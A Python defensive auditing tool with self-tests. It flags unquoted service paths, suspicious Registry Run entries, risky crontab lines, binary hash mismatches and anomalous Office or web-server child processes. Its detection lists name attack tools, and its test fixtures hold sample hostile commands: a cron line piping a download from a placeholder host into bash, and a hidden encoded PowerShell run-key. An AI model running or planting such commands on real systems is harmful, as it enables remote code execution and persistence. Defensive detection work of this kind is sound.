#!/usr/bin/env python3
"""
Host Defense & System Security Auditor
Standalone diagnostic tool for evaluating host persistence vectors,
Unquoted Service Paths (CWE-428), crontab integrity, binary hash verification,
and Sysmon telemetry parent-child anomaly detection.
"""

import os
import re
import hashlib
import binascii
from typing import Dict, List, Tuple, Optional

# Operational Redaction Helper
def redact_string(val: str, prefix_len: int = 4) -> str:
    """Redacts sensitive values to first 4 chars + ****REDACTED."""
    if len(val) <= prefix_len:
        return val[:prefix_len] + "****REDACTED"
    return val[:prefix_len] + "****REDACTED"

def audit_unquoted_service_path(path_string: str) -> Dict[str, any]:
    """
    Evaluates a Windows service image path for CWE-428 (Unquoted Service Path).
    If a path contains spaces, is not enclosed in quotation marks, and contains subdirectories,
    Windows will attempt to execute intermediary executables.
    """
    trimmed = path_string.strip()
    is_quoted = trimmed.startswith('"') and ('"' in trimmed[1:])
    
    # Extract binary path before arguments
    match = re.search(r'^(.*?\.exe)', trimmed, re.IGNORECASE)
    binary_path = match.group(1) if match else trimmed
    
    # Clean surrounding quotes if checking inner path
    inner_path = binary_path.strip('"')
    has_spaces = ' ' in inner_path
    
    is_vulnerable = has_spaces and not is_quoted
    
    candidates = []
    if is_vulnerable:
        parts = inner_path.split(' ')
        for i in range(1, len(parts)):
            candidate_path = ' '.join(parts[:i]) + '.exe'
            candidates.append(candidate_path)
            
    return {
        "Raw_Path": path_string,
        "Is_Quoted": is_quoted,
        "Has_Spaces": has_spaces,
        "Is_Vulnerable_CWE_428": is_vulnerable,
        "Hijack_Candidates": candidates,
        "Risk_Level": "HIGH" if is_vulnerable else "LOW"
    }

def audit_registry_persistence(reg_entries: List[Dict[str, str]]) -> List[Dict[str, any]]:
    """
    Audits Windows Registry Run/RunOnce auto-start extensibility points (ASEPs).
    Flags suspicious commands, encodings, and executions from temp directories.
    """
    findings = []
    suspicious_patterns = [
        r'powershell.*-e[nc]',
        r'powershell.*-nop.*-w\s+hidden',
        r'cmd\.exe\s+/c',
        r'mshta\.exe',
        r'wscript\.exe',
        r'cscript\.exe',
        r'rundll32\.exe.*javascript:',
        r'\\appdata\\local\\temp\\',
        r'\\users\\public\\'
    ]
    
    for entry in reg_entries:
        key_name = entry.get("Key", "")
        value_name = entry.get("Name", "")
        command = entry.get("Command", "")
        
        reasons = []
        for pattern in suspicious_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                reasons.append(f"Matches suspicious pattern: '{pattern}'")
                
        # Check for unquoted execution path
        if ' ' in command and not command.startswith('"') and command.lower().endswith('.exe'):
            reasons.append("Unquoted executable path in Registry ASEP")
            
        is_suspicious = len(reasons) > 0
        findings.append({
            "Key": key_name,
            "Value_Name": value_name,
            "Command": command,
            "Is_Suspicious": is_suspicious,
            "Reasons": reasons,
            "Risk_Level": "CRITICAL" if len(reasons) > 1 else ("HIGH" if is_suspicious else "LOW")
        })
        
    return findings

def audit_cron_integrity(cron_lines: List[str]) -> List[Dict[str, any]]:
    """
    Parses Linux crontab entries, identifying dangerous pipes, writable paths,
    and unprivileged binary downloads.
    """
    results = []
    suspicious_pipes = [r'\|\s*sh', r'\|\s*bash', r'curl.*http', r'wget.*http']
    writable_paths = [r'/tmp/', r'/var/tmp/', r'/dev/shm/']
    
    for line in cron_lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
            
        reasons = []
        for pipe in suspicious_pipes:
            if re.search(pipe, line, re.IGNORECASE):
                reasons.append(f"Dangerous download-and-execute pipe: '{pipe}'")
                
        for wpath in writable_paths:
            if re.search(wpath, line, re.IGNORECASE):
                reasons.append(f"Executes from insecure/world-writable location: '{wpath}'")
                
        is_high_risk = len(reasons) > 0
        results.append({
            "Cron_Entry": line,
            "Is_High_Risk": is_high_risk,
            "Anomalies": reasons,
            "Risk_Level": "CRITICAL" if len(reasons) > 1 else ("HIGH" if is_high_risk else "LOW")
        })
        
    return results

def verify_binary_integrity(data_or_path: bytes, expected_sha256: str) -> Dict[str, any]:
    """Calculates SHA-256 digest and validates against expected trusted baseline."""
    computed_hash = hashlib.sha256(data_or_path).hexdigest()
    is_match = computed_hash.lower() == expected_sha256.lower()
    
    return {
        "Computed_SHA256": computed_hash,
        "Expected_SHA256": expected_sha256,
        "Integrity_Verified": is_match,
        "Status": "VALID_BASELINE" if is_match else "TAMPER_DETECTED"
    }

def detect_sysmon_process_anomalies(process_events: List[Dict[str, str]]) -> List[Dict[str, any]]:
    """
    Analyzes parent-child process relationships to detect living-off-the-land (LotL)
    and weaponized document execution patterns (MITRE ATT&CK T1059 / T1204).
    """
    abnormal_pairs = {
        "winword.exe": ["powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe"],
        "excel.exe": ["powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe", "mshta.exe"],
        "w3wp.exe": ["powershell.exe", "cmd.exe", "whoami.exe", "net.exe"],
        "nginx": ["sh", "bash", "python", "perl", "nc"],
        "apache2": ["sh", "bash", "python", "perl", "nc"]
    }
    
    alerts = []
    for evt in process_events:
        parent = evt.get("ParentImage", "").split("\\")[-1].split("/")[-1].lower()
        child = evt.get("ChildImage", "").split("\\")[-1].split("/")[-1].lower()
        cmdline = evt.get("CommandLine", "")
        pid = evt.get("ProcessId", "")
        
        if parent in abnormal_pairs and child in abnormal_pairs[parent]:
            alerts.append({
                "Alert": "ANOMALOUS_PARENT_CHILD_EXECUTION",
                "Parent_Process": parent,
                "Child_Process": child,
                "Process_ID": pid,
                "Command_Line": redact_string(cmdline, 20),
                "MITRE_Technique": "T1059.001 (PowerShell) / T1204.002 (Malicious File)",
                "Risk_Level": "CRITICAL"
            })
            
    return alerts

def run_self_tests():
    print("[*] Running Host Defense Auditor Self-Tests...")
    
    # Test 1: Unquoted Service Path Detection (CWE-428)
    vulnerable_svc = r"C:\Program Files\Vulnerable Software Suite\Agent\service.exe"
    audit_res = audit_unquoted_service_path(vulnerable_svc)
    assert audit_res["Is_Vulnerable_CWE_428"] is True
    assert len(audit_res["Hijack_Candidates"]) == 3
    assert audit_res["Hijack_Candidates"][0] == r"C:\Program.exe"
    assert audit_res["Hijack_Candidates"][1] == r"C:\Program Files\Vulnerable.exe"
    print(f"[+] Test 1 Passed: Detected CWE-428 unquoted path with {len(audit_res['Hijack_Candidates'])} candidates.")

    # Test 2: Quoted Service Path (Hardened)
    hardened_svc = r'"C:\Program Files\Hardened Software Suite\service.exe" -run'
    audit_hardened = audit_unquoted_service_path(hardened_svc)
    assert audit_hardened["Is_Vulnerable_CWE_428"] is False
    print("[+] Test 2 Passed: Quoted service path verified as secure.")

    # Test 3: Registry Persistence Auditing
    sample_reg = [
        {"Key": r"HKLM\...\Run", "Name": "Updater", "Command": r'"C:\Program Files\Corp\updater.exe"'},
        {"Key": r"HKCU\...\Run", "Name": "SystemSync", "Command": r'powershell.exe -w hidden -enc JABhID0...'}
    ]
    reg_findings = audit_registry_persistence(sample_reg)
    assert reg_findings[0]["Is_Suspicious"] is False
    assert reg_findings[1]["Is_Suspicious"] is True
    assert reg_findings[1]["Risk_Level"] in ["HIGH", "CRITICAL"]
    print(f"[+] Test 3 Passed: Registry persistence audit accurately identified hidden PowerShell execution.")

    # Test 4: Crontab Integrity Auditing
    sample_crontab = [
        "0 2 * * * /usr/local/bin/backup.sh >/dev/null 2>&1",
        "*/5 * * * * curl -s http://internal.bad.test/script.sh | bash",
        "* * * * * /tmp/.daemon_agent"
    ]
    cron_res = audit_cron_integrity(sample_crontab)
    assert cron_res[0]["Is_High_Risk"] is False
    assert cron_res[1]["Is_High_Risk"] is True
    assert cron_res[2]["Is_High_Risk"] is True
    print(f"[+] Test 4 Passed: Linux crontab audit identified dangerous pipes and writable execution directories.")

    # Test 5: Binary Hashing Integrity
    test_binary = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00TestBinaryContent"
    expected_hash = hashlib.sha256(test_binary).hexdigest()
    verify_valid = verify_binary_integrity(test_binary, expected_hash)
    assert verify_valid["Integrity_Verified"] is True
    
    verify_invalid = verify_binary_integrity(test_binary, "0000000000000000000000000000000000000000000000000000000000000000")
    assert verify_invalid["Integrity_Verified"] is False
    print("[+] Test 5 Passed: Binary integrity baseline comparison functioning properly.")

    # Test 6: Sysmon Parent-Child Anomaly Detection
    sample_events = [
        {"ParentImage": r"C:\Windows\explorer.exe", "ChildImage": r"C:\Program Files\App\app.exe", "CommandLine": "app.exe", "ProcessId": "1001"},
        {"ParentImage": r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE", "ChildImage": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -enc AAAA", "ProcessId": "2048"}
    ]
    sysmon_alerts = detect_sysmon_process_anomalies(sample_events)
    assert len(sysmon_alerts) == 1
    assert sysmon_alerts[0]["Parent_Process"] == "winword.exe"
    assert sysmon_alerts[0]["Child_Process"] == "powershell.exe"
    print(f"[+] Test 6 Passed: Sysmon process anomaly detector caught weaponized Office doc execution.")

    print("[*] All Host Defense Auditor tests completed with 100% success.")

if __name__ == "__main__":
    run_self_tests()
